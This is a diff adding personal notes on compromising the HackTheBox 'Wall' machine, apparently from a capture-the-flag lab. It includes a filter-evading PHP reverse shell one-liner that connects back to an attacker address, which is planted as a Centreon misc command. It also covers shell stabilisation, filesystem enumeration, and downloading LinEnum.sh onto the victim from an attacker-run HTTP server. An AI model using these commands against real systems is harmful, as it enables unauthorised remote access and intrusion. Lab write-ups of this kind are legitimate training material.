@@ -63,6 +63,70 @@ shotop@kali:~/Pentesting/HackTheBox/Boxes/wall/searchsploit$ python /usr/share/e
 [+] Retrieving CSRF token to submit the login form
 
 
+^^ above exploit never worked because I couldn't figure out a working reverse shell to use.  It did however create my poller.  
+
+Needed a PHP reverse shell:
+php${IFS}-r${IFS}'$s=fsockopen("10.10.14.12",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
+
+Saved the above reverse shell script as a misc command in Centreon.  Applied that misc command to the Central poller created by the exploit.
+
+Jumped to page 60602 in centreon per advice from reddit thread. 
+
+
+
+
+
+Stabalized reverse shell:
+on victim
+python -c "import pty; pty.spawn('/bin/bash')"
+
+ctrl-z to jump back to local
+
+on local: 
+stty raw -echo
+fg
+
+back on victim:
+export TERM=xterm
+
+
+
+
+Find all user directories:
+www-data@Wall:/$ find / -type d -name "user" 2>&1 | grep -v "Permission denied"
+/run/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/thermal/gov/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/fw/loader/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/test/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/infiniband/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/crypto/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/have/perf/user
+/usr/src/linux-headers-4.15.0-54-generic/include/config/have/user
+/usr/src/linux-headers-4.15.0-54/tools/testing/selftests/user
+/usr/lib/systemd/user
+/etc/systemd/user
+/proc/sys/user
+
+
+
+Linux Enumeration
+
+download LinEnum.sh file
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+make www directory in /wall on kali to store enum.sh file
+
+in www directory, start python simple http server
+python -m SimpleHTTPServer
+
+on victim machine, wget linEnum file from http server on attacking machine
+wget 10.10.14.12:8000/LinEnum.sh
+
+update permissions on downloaded file
+chmod +x LinEnum.sh
+
 
 
 
